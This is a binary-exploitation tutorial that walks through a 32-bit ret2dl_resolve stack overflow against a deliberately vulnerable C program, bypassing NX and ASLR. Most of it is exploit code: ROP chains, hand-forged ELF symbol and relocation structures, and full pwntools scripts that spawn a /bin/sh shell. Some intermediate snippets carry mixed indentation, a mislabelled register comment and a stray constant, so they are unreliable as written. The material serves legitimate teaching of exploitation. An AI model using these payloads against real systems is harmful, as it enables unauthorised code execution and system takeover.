# EXPLOITS
## STACK BUFFER OVERFLOW FOR Return into dlresolve attack (Ret2dl_resolve)
## REQUIRED TO UNDERSTAND : STACK BUFFER OVERFLOW FOR RETURN TO LIBC (ret2libc) and STACK BUFFER OVERFLOW FOR RETURN ORIENTED PROGRAMMING (ROP)
## Bypass protections : NX, ASLR
This is another attack to bypass NX and ASLR with a ret2libc  
In this attack, we will resolve a symbol of our choice (like system) then we can pass arguments to it (like /bin/sh)  
In order to do this, we will have to overwrite 3 structures  
There are two parts of the attack :
1. The preparing part
2. The dlresolve payload
During the preparing part, we will just set-up some addresses using some gadgets to let the real exploit work  
During the dlresolve part, we will overwrite those 3 structures  
These are the structures we will have to overwrite :
- The `SYMTAB` structure instance which is an instance of the `Elf32_Sym` structure :
```c
typedef struct 
{ 
   Elf32_Word st_name ; /* Symbol name (string tbl index) */
   Elf32_Addr st_value ; /* Symbol value */ 
   Elf32_Word st_size ; /* Symbol size */ 
   unsigned char st_info ; /* Symbol type and binding */ 
   unsigned char st_other ; /* Symbol visibility under glibc>=2.2 */ 
   Elf32_Section st_shndx ; /* Section index */ 
} Elf32_Sym ;
```
- The `JMPTAB` structure which is from the segment `.rel.plt`, it's the relocation symbol, there are all the symbol entries stored in it which are instances of the strucutre `Elf32_Rel` :
```c
typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Word;
typedef struct
{
  Elf32_Addr    r_offset;               /* Address */
  Elf32_Word    r_info;                 /* Relocation type and symbol index */
} Elf32_Rel;
/* How to extract and insert information held in the r_info field.  */
#define ELF32_R_SYM(val)                ((val) >> 8)
#define ELF32_R_TYPE(val)               ((val) & 0xff)
```
- The `STRTAB` wich gathers symlobs names as strings

So let's move on and let's have a look at the actual source code :
```c
#include <unistd.h>

void vuln(void){
    char buf[64];
    read(STDIN_FILENO, buf, 200);
}
int main(int argc, char** argv){
    vuln();
}
```
You can see that `main()` calls `vuln()` that will allocate a 64 bytes buffer, then it calls this function, `read` (from `unistd.h`), but `read` is a syscall that reads the from the file descriptor that we've specified, `STDIN_FILENO` (0), in this example it will read 200 bytes to store them on a buffer that is only 64 bytes, so of course, we can overflow it  
To compile it with GCC, we will use :
```
gcc <source code file>.c -o <executable> -fno-stack-protector -m32 -no-pie
```
Also you can enable ASLR, it won't affect the exploit (we will somehow bypass it)  
Now for the exploit, in pwntools, there's a payload object that we can use to automate the process, but we're not going to use that, but we will use the object to get some addresses from the binary and some offsets that pwnttols will calculate, so pwnttols will do a part of the process but we'll still do the most important part  
First, we will setup the code :
```python
import struct
from pwn import *
elf = context.binary = ELF('./vuln') # we open the binary
p = elf.process() # we launch the process
```
Now let's create the payload from which we'll extract some addresses :
```python
dlresolve_payload = Ret2dlresolvePayload(elf, symbol='system', args=["/bin/sh"])
```
Awesome ! (note that i prepared the payload arguments such as the symbol we want to resolve and it's argument when it'll be executed but it's useless for our usage)  
Now let's create a function that will give us the first ropchain, but, before we do that, we need some more informations  
First, we have to get the `read` function address in the `plt`, so to do that, let's use gdb
```python
gdb <executable>
# (gdb)>
disass vuln
```
It should give something like this :
```nasm
Dump of assembler code for function vuln:
   0x08049162 <+0>:	push   ebp
   0x08049163 <+1>:	mov    ebp,esp
   0x08049165 <+3>:	push   ebx
   0x08049166 <+4>:	sub    esp,0x44
   0x08049169 <+7>:	call   0x80491ad <__x86.get_pc_thunk.ax>
   0x0804916e <+12>:	add    eax,0x2e92
   0x08049173 <+17>:	sub    esp,0x4
   0x08049176 <+20>:	push   0xc8
   0x0804917b <+25>:	lea    edx,[ebp-0x48]
   0x0804917e <+28>:	push   edx
   0x0804917f <+29>:	push   0x0
   0x08049181 <+31>:	mov    ebx,eax
   0x08049183 <+33>:	call   0x8049030 <read@plt> <------------------------------------------
   0x08049188 <+38>:	add    esp,0x10
   0x0804918b <+41>:	nop
   0x0804918c <+42>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804918f <+45>:	leave  
   0x08049190 <+46>:	ret    
End of assembler dump.
```
We have a call at `0x8049030` (in this case) which is the address of `read@plt` (`read` in the procedure linkage table or function trampoline)  
So from that we can start the function :
```python
def make_ropchain(padding, dlresolve): # don't focus on this dlresolve argument for now
   payload = bytearray() # required since python3
   payload += ('A'*padding).encode()
	payload += struct.pack("I", 0x08049030) # read@plt
```
So the padding is the number of bytes that we have to write before overwriting EIP in the buffer overflow, in this case it's `64 + 8 + 4 = 76`  
Then you can see the that we call `read@plt` that's actually because we will pass read the input again for the other payload (the dlresolve payload)  
Then we need to setup two registers : `ESI` and `EBP`, guess what we will use to setup them... Let me give you a hint, it comes from return oriented programming...  
Yes, a gadget ! So let's look for the gadget `pop edi` in the binary using ROPgadget :
```
ROPgadget --binary vuln | grep "pop edi"
```
```
0x08049215 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049214 : jecxz 0x8049199 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08049213 : jne 0x80491f8 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08049216 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08049217 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x08049218 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804921a : pop edi ; pop ebp ; ret
0x08049219 : pop esi ; pop edi ; pop ebp ; ret
```
Jackpot ! We have a `pop edi ; pop ebp ; ret` gadget at `0x0804921a`, awesome !  
So let's get back into the exploit :
```python
def make_ropchain(padding, dlresolve):
	payload = bytearray()
	payload += ('A'*padding).encode()
	payload += struct.pack("I", 0x08049030) # read@plt
	payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
```
But what will we set into these registers ? Well first we will set nothing (so 0x00000000) in `EDI` because we will not use it and we will set the symbol name address which we'll extract from the dlresolve payload in `EBP` :
```python
def make_ropchain(padding, dlresolve):
	payload = bytearray()
	payload += ('A'*padding).encode()
	payload += struct.pack("I", 0x08049030) # read@plt
	payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
   payload += struct.pack("I", 0x00000000) # args[0] => Null => EBP
	payload += struct.pack("I", dlresolve.data_addr) # args[1] -> Symbol name address (dlresolve.data_addr) => EBP
```
Then we will actually jump to the `plt_init` which is `16` bytes before the first `PLT` function so `read` so `0x08049030 - 16 = 0x8049020`:
```python
def make_ropchain(padding, dlresolve):
	payload = bytearray()
	payload += ('A'*padding).encode()
	payload += struct.pack("I", 0x08049030) # read@plt
	payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
	payload += struct.pack("I", 0x00000000) # args[0] -> Null
	payload += struct.pack("I", dlresolve.data_addr) # args[1] -> Symbol name address (dlresolve.data_addr)
	payload += struct.pack("I", 0x08049030-16) # [plt_init] system(dlresolve.data_addr+36) so dlresolve.data_addr+36 is the argument that will use system when it will get executed
```
Then comes the relocation index :
```python
def make_ropchain(padding, dlresolve):
	payload = bytearray()
	payload += ('A'*padding).encode()
	payload += struct.pack("I", 0x08049030) # read@plt
	payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
	payload += struct.pack("I", 0x00000000) # args[0] -> Null
	payload += struct.pack("I", dlresolve.data_addr) # args[1] -> Symbol name address (dlresolve.data_addr)
	payload += struct.pack("I", 0x08049030-16) # [plt_init] system(dlresolve.data_addr+36) so dlresolve.data_addr+36 is the argument that will use system when it will get executed
   payload += struct.pack("I", dlresolve.reloc_index) # reloc index (dlresolve.reloc_index)
```
Finally, we need the return address followed by the argument of the address target function that we want to execute, for now, it contains nothing but during the dlresolve exploit, we can write the argument we want (like "/bin/sh") to it followed by a null byte, the address is the `Symbol name address + 36`, and we can return the `payload`:
```python
def make_ropchain(padding, dlresolve):
	payload = bytearray()
	payload += ('A'*padding).encode()
	payload += struct.pack("I", 0x08049030) # read@plt
	payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
	payload += struct.pack("I", 0x00000000) # args[0] -> Null
	payload += struct.pack("I", dlresolve.data_addr) # args[1] -> Symbol name address (dlresolve.data_addr)
	payload += struct.pack("I", 0x08049030-16) # [plt_init] system(dlresolve.data_addr+36) so dlresolve.data_addr+36 is the argument that will use system when it will get executed
	payload += struct.pack("I", dlresolve.reloc_index) # reloc index (dlresolve.reloc_index)
	payload += ("AAAA").encode() # return address (not important)
	payload += struct.pack("I", dlresolve.data_addr+36) # args[0] of system which will be written in the dlresolve_payload
	# for the dlresolve.data_addr+36, we could also have used dlresolve.real_args[0], it's the same address
	return payload
```
Now let's construct the dlresolve payload :
```python
def make_dlresolve_payload(dlresolve, arg="/bin/sh"):
	# like dlresolve_payload.payload
	payload = bytearray()
```
First we have to write the symbol we want which is `system` to the symbol name followed by a null byte and 5 bytes that we're not gonna use so we can set it to anything :
```python
def make_dlresolve_payload(dlresolve, arg="/bin/sh"):
	# like dlresolve_payload.payload
	payload = bytearray()
	# Write the symbol (system) to Symbol name addr
	payload += b"system"
	payload += b"\x00"
	payload += b"A"*5
```
Then comes the `SYMTAB`, we will first set the index, it will be the reloc index + 96 which contains the symbol name to execute so `"system"` after that we will add 12 null bytes for the rest of the structure because we won't use them :
```python
def make_dlresolve_payload(dlresolve, arg="/bin/sh"):
	# like dlresolve_payload.payload
	payload = bytearray()
	# Write the symbol (system) to Symbol name addr
	payload += b"system"
	payload += b"\x00"
	payload += b"A"*5
	# The SYMTAB structure (instance of the structure Elf32_Sym)
	payload += struct.pack("I", dlresolve.reloc_index+96) # index/offset of the symbol system in the structure
	payload += struct.pack("I", 0x00000000)*3 # other values in the struct (they're not important)
```
After that, we will overwrite the `JMPTAB` structure with first the Symbol name address and the `r_info` variable, to get it, we can extract it from the dlresolve payload which was generated by pwntools, in order to do this, we will add 2 functions :
```python
def find_addr32_index(a, arr):
	for i in range(len(arr)):
		if arr[i] == a[0] and arr[i+1] == a[0+1] and arr[i+2] == a[0+2] and arr[i+3] == a[0+3]:
			return i
def find_addr32_in_arr(arr, startidx):
	values = bytearray()
	for i in range(4):
		values.append(arr[startidx+i])
	ret = struct.unpack("I", values)
	return ret[0]
```
Then let's use them to find where the `r_info` starts and what is it's value
```python
def make_dlresolve_payload(dlresolve, arg="/bin/sh"):
	# like dlresolve_payload.payload
	payload = bytearray()
	# Write the symbol (system) to Symbol name addr
	payload += b"system"
	payload += b"\x00"
	payload += b"A"*5
	# The SYMTAB structure (instance of the structure Elf32_Sym)
	payload += struct.pack("I", dlresolve.reloc_index+96) # index/offset of the symbol system in the structure
	payload += struct.pack("I", 0x00000000)*3 # other values in the struct (they're not important)
	# The JMPTAB structure (instance of the structure Elf32_Rel)
	payload += struct.pack("I", dlresolve_payload.data_addr) # Symbol name address (system)
	payload += struct.pack("I", 0x0004c007)
	data_addr_index = find_addr32_index(struct.pack("I", dlresolve_payload.data_addr), dlresolve.payload)
	r_info = find_addr32_in_arr(dlresolve.payload, data_addr_index+4)
	payload += struct.pack("I", r_info)
```
The last thing we're gonna specify is the argument for the target function that we want to execute which is passed in the exploit function as `arg` plus a null byte, then we can return the `payload` :
```python
def make_dlresolve_payload(dlresolve, arg="/bin/sh"):
	# like dlresolve_payload.payload
	payload = bytearray()
	# Write the symbol (system) to Symbol name addr
	payload += b"system"
	payload += b"\x00"
	payload += b"A"*5
	# The SYMTAB structure (instance of the structure Elf32_Sym)
	payload += struct.pack("I", dlresolve.reloc_index+96) # index/offset of the symbol system in the structure
	payload += struct.pack("I", 0x00000000)*3 # other values in the struct (they're not important)
	# The JMPTAB structure (instance of the structure Elf32_Rel)
	payload += struct.pack("I", dlresolve_payload.data_addr) # Symbol name address (system)
	data_addr_index = find_addr32_index(struct.pack("I", dlresolve_payload.data_addr), dlresolve.payload)
	r_info = find_addr32_in_arr(dlresolve.payload, data_addr_index+4)
	payload += struct.pack("I", r_info)
	# Finally, the argument of the symbol
	payload += arg.encode() # which will be written to dlresolve.data_addr+36 and
	payload += b"\x00"
	return payload
```
Perfect now the last part of the exploit, we can just send both of the payloads and the function will be executed :
```python
payload1 = make_ropchain(76, dlresolve_payload)
payload2 = make_dlresolve_payload(dlresolve_payload, "/bin/sh") # or any command we want to execute

p.sendline(payload1)
# In the read, we will pass the dlresolve payload
p.sendline(payload2) # if it's not working you can pass it the dlresolve_payload.payload

p.interactive() # A shell should be summoned
```
If you have an error like :
```
Inconsistency detected by ld.so: dl-runtime.c: 80: _dl_fixup: Assertion `ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT' failed!
```
It's either because your exploit is wrong or you should try again until it works, at worst of the cases, you can also reboot the system  
Here is the entire payload i used :
```python
import struct
from pwn import *
elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
exploit_log_level = 3 # 0 : No log | 1 : Verbose | 2 : Debug
if exploit_log_level >= 2:
	context.log_level = 'debug'

dlresolve_payload = Ret2dlresolvePayload(elf, symbol='system', args=["/bin/sh"])

def print_bytes(a):
	print("[", end="")
	for elem in a:
		print(str(hex(elem))+", ", end="")
		if(elem == 0x0a):
			print("]\n[", end="")
	print("]")
def print_x(a):
	c = []
	i = 0
	for i in range(len(a)-4):
		c.append(bytearray())
	
		c[i] = bytearray([a[i], a[i+1], a[i+2], a[i+3]])

	print("[", end="")
	for elem in c:
		x = struct.unpack("I", elem)
		print(hex(x[0])+", ", end="")
	print("]")


def find_addr32_index(a, arr):
	for i in range(len(arr)):
		if arr[i] == a[0] and arr[i+1] == a[0+1] and arr[i+2] == a[0+2] and arr[i+3] == a[0+3]:
			return i
def find_addr32_in_arr(arr, startidx):
	values = bytearray()
	for i in range(4):
		values.append(arr[startidx+i])
	ret = struct.unpack("I", values)
	return ret[0]
def make_ropchain(padding, dlresolve):

	read_plt = 0x08049030
	resolver = 0x08049030-16

	payload = bytearray()
	payload += ('A'*padding).encode()
	payload += struct.pack("I", read_plt) # read@plt
	payload += struct.pack("I", 0x0804921a) # ropgadget : pop edi; pop ebp; ret
	payload += struct.pack("I", 0x00000000) # args[0] -> Null
	payload += struct.pack("I", dlresolve.data_addr) # args[1] -> Symbol name address (dlresolve.data_addr)
	payload += struct.pack("I", resolver) # [plt_init] system(dlresolve.data_addr+36) so dlresolve.data_addr+36 is the argument that will use system when it will get executed
	payload += struct.pack("I", dlresolve.reloc_index) # reloc index (dlresolve.reloc_index)
	payload += ("AAAA").encode() # return address (not important)
	payload += struct.pack("I", dlresolve.real_args[0]) # args[0] of system which will be written in the second payload (dlresolve.data_addr+36)
	return payload
def make_dlresolve_payload(dlresolve, arg="/bin/sh"):
	symbol_name = b"system"
	# like dlresolve_payload.payload
	payload = bytearray()
	# Write the symbol (system) to Symbol name addr
	payload += symbol_name
	payload += b"\x00"
	payload += b"A"*5
	# The SYMTAB structure (instance of the structure Elf32_Sym)
	payload += struct.pack("I", dlresolve.reloc_index+96) # index/offset of the symbol system in the structure
	payload += struct.pack("I", 0x00000000)*3 # other values in the struct (they're not important)
	# The JMPTAB structure (instance of the structure Elf32_Rel)
	payload += struct.pack("I", dlresolve_payload.data_addr) # Symbol name address (system)
	# For the r_info variable i extracted it direcly from the pwntools dlresolve payload :
	data_addr_index = find_addr32_index(struct.pack("I", dlresolve_payload.data_addr), dlresolve.payload)
	r_info = find_addr32_in_arr(dlresolve.payload, data_addr_index+4)
	if exploit_log_level >= 1:
		print("[*] r_info : "+str(hex(r_info)))
	payload += struct.pack("I", r_info)
	# Finally, the argument of the symbol
	payload += arg.encode() # which will be written to dlresolve.data_addr+36 and
	payload += b"\x00"
	return payload

if exploit_log_level >= 1:
	print("[*] Data addr : "+str(hex(dlresolve_payload.data_addr)))
	print("[*] Reloc index : "+str(hex(dlresolve_payload.reloc_index)))

payload1 = make_ropchain(76, dlresolve_payload)
payload2 = make_dlresolve_payload(dlresolve_payload, "/bin/sh")

fullpayload = payload1
fullpayload += "\n".encode()
fullpayload += payload2
# full payload for any usage

if exploit_log_level >= 2:
	print("[@] Full exploit payload : ")
	print_x(payload1)
	#print_x(dlresolve_payload.payload)
	print_x(payload2)

if exploit_log_level >= 1:
	print("[*] Sending the first ropchain...")
p.sendline(payload1)
if exploit_log_level >= 1:
	print("[*] Sending the dlresolve payload...")
# now the read is called and we pass all the relevant structures in
p.sendline(payload2) # if it's not working you can pass it the dlresolve_payload.payload

p.interactive()
```
You can also use the payloads from pwntools :
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76) # offset
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
